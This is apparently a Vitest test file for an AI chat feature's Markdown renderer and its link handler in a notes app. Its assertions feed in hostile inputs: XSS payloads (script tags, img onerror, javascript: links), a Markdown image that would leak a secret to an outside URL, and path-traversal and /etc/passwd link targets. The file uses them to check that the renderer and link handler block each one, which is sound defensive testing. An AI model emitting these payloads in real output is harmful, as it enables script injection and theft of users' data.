// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { openReplyLink, readReply, replyHtml, writeReply } from "../ai/reply-markdown";

describe("chat reply Markdown", () => {
  it("renders emphasis, lists and links", () => {
    const html = replyHtml("Use **TableNow**.\n\n- one\n- two\n\nSee [Kickoff](meetings/Kickoff.md).");
    expect(html).toContain("<strong>TableNow</strong>");
    expect(html).toContain("<li>one</li>");
    expect(html).toContain('<a href="meetings/Kickoff.md">Kickoff</a>');
  });

  it("escapes raw HTML from the model instead of running it", () => {
    const html = replyHtml('<script>alert(1)</script><img src=x onerror="alert(1)">');
    expect(html).not.toContain("<script");
    expect(html).not.toContain("<img");
    expect(html).toContain("&lt;script&gt;");
  });

  it("never loads an image a reply points at", () => {
    const html = replyHtml("![x](https://example.com/leak?d=secret)");
    expect(html).not.toContain("<img");
  });

  it("drops javascript: links", () => {
    expect(replyHtml("[go](javascript:alert(1))")).not.toMatch(/<a [^>]*javascript:/);
  });

  it("keeps the Markdown source for saving and copying", () => {
    const bubble = document.createElement("div");
    writeReply(bubble, "Use **TableNow**.");
    expect(bubble.querySelector("strong")?.textContent).toBe("TableNow");
    expect(bubble.textContent?.trim()).toBe("Use TableNow.");
    expect(readReply(bubble)).toBe("Use **TableNow**.");
  });

  it("writes plain text to a handle that is not an element", () => {
    const handle = { textContent: null as string | null };
    writeReply(handle, "**x**");
    expect(handle.textContent).toBe("**x**");
    expect(readReply(handle)).toBe("**x**");
  });

  it("opens web links in the browser and relative links as notes in the folder", () => {
    const notes: string[] = []; const web: string[] = [];
    const open = (href: string, folder: string | null = "/notes") => openReplyLink(href, folder, (p) => notes.push(p), (u) => web.push(u));
    open("https://example.com/a");
    open("meetings/2026-11-12%20Kickoff.md#actions");
    open("a/../b.md");
    expect(web).toEqual(["https://example.com/a"]);
    expect(notes).toEqual(["/notes/meetings/2026-11-12 Kickoff.md", "/notes/b.md"]);
  });

  it("ignores links that leave the folder, other schemes, or have no folder", () => {
    const calls: string[] = [];
    const open = (href: string, folder: string | null = "/notes") => openReplyLink(href, folder, (p) => calls.push(p), (u) => calls.push(u));
    open("../secret.md"); open("/etc/passwd"); open("file:///etc/passwd"); open("javascript:alert(1)"); open("#top"); open("a.md", null); open("%E0%A4%A");
    expect(calls).toEqual([]);
  });
});
